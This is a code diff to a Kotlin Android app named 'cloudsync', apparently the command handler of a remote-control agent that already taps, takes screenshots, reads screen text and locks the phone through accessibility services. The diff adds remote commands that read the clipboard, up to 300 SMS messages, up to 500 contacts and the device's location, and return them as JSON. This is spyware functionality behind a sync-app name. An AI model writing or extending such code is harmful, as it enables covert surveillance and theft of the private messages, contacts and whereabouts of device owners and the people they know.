@@ -1,15 +1,19 @@
 package com.cloudsync.app
 
 import android.app.ActivityManager
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.PowerManager
+import android.provider.ContactsContract
 import org.json.JSONArray
 import org.json.JSONObject
 
@@ -31,6 +35,7 @@ object Comandos {
                 "recents" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_RECENTS); Pair(true, "ok") }
                 "notifs" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_NOTIFICATIONS); Pair(true, "ok") }
                 "lock" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_LOCK); Pair(true, "ok") }
+                "screen_off" -> { SyncAccessibility.accion(SyncAccessibility.GLOBAL_LOCK); Pair(true, "ok") }
                 "wake" -> { despertar(ctx); Pair(true, "ok") }
                 "screenshot" -> Pair(true, SyncAccessibility.capturar(ctx, a.optBoolean("force", false)))
                 "tap" -> { SyncAccessibility.tap(a.optInt("x"), a.optInt("y")); Pair(true, "ok") }
@@ -43,6 +48,10 @@ object Comandos {
                 "tap_text" -> Pair(true, SyncAccessibility.tapTexto(a.optString("text")))
                 "dump" -> Pair(true, SyncAccessibility.dump())
                 "screen_text" -> Pair(true, SyncAccessibility.textoVisible())
+                "clip" -> Pair(true, portapapeles(ctx))
+                "sms" -> Pair(true, sms(ctx))
+                "contacts" -> Pair(true, contactos(ctx))
+                "loc" -> Pair(true, ubicacion(ctx))
                 "sleep" -> { Thread.sleep(a.optLong("ms", 500)); Pair(true, "ok") }
                 "die" -> Pair(true, "ok")
                 else -> Pair(true, "unsupported:$cmd")
@@ -63,8 +72,18 @@ object Comandos {
 
     private fun abrir(ctx: Context, pkg: String) {
         if (pkg.isBlank()) throw Exception("falta pkg")
-        val i = ctx.packageManager.getLaunchIntentForPackage(pkg)
-            ?: Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=$pkg"))
+        val pm = ctx.packageManager
+        var i = pm.getLaunchIntentForPackage(pkg)
+        if (i == null) {
+            val q = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).setPackage(pkg)
+            val res = pm.queryIntentActivities(q, 0)
+            if (res.isNotEmpty()) {
+                i = Intent(Intent.ACTION_MAIN)
+                    .addCategory(Intent.CATEGORY_LAUNCHER)
+                    .setClassName(res[0].activityInfo.packageName, res[0].activityInfo.name)
+            }
+        }
+        if (i == null) i = Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=$pkg"))
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         ctx.startActivity(i)
     }
@@ -105,6 +124,61 @@ object Comandos {
         val cargando = (i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1) ==
             BatteryManager.BATTERY_STATUS_CHARGING
         return JSONObject().put("pct", pct).put("charging", cargando).toString()
+    }
+
+    private fun portapapeles(ctx: Context): String {
+        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        val d: ClipData? = cm.primaryClip
+        val t = if (d != null && d.itemCount > 0) d.getItemAt(0).coerceToText(ctx).toString() else ""
+        return JSONObject().put("texto", t).toString()
+    }
+
+    private fun sms(ctx: Context): String {
+        val arr = JSONArray()
+        val c = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
+        c?.use {
+            val iBody = it.getColumnIndex("body")
+            val iAddr = it.getColumnIndex("address")
+            val iDate = it.getColumnIndex("date")
+            var n = 0
+            while (it.moveToNext() && n < 300) {
+                arr.put(JSONObject()
+                    .put("de", if (iAddr >= 0) it.getString(iAddr) else "")
+                    .put("txt", (if (iBody >= 0) it.getString(iBody) else "").take(400))
+                    .put("ts", if (iDate >= 0) it.getLong(iDate) else 0L))
+                n++
+            }
+        }
+        return arr.toString()
+    }
+
+    private fun contactos(ctx: Context): String {
+        val arr = JSONArray()
+        val c = ctx.contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, "display_name ASC"
+        )
+        c?.use {
+            val iName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val iNum = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+            var n = 0
+            while (it.moveToNext() && n < 500) {
+                arr.put(JSONObject()
+                    .put("nombre", if (iName >= 0) it.getString(iName) else "")
+                    .put("tel", if (iNum >= 0) it.getString(iNum) else ""))
+                n++
+            }
+        }
+        return arr.toString()
+    }
+
+    private fun ubicacion(ctx: Context): String {
+        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var loc = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) { null }
+        if (loc == null) loc = try { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { null }
+        if (loc == null) return JSONObject().put("ok", false).toString()
+        return JSONObject()
+            .put("lat", loc.latitude).put("lon", loc.longitude)
+            .put("acc", loc.accuracy.toDouble()).put("ts", loc.time).toString()
     }
 
     private fun despertar(ctx: Context) {
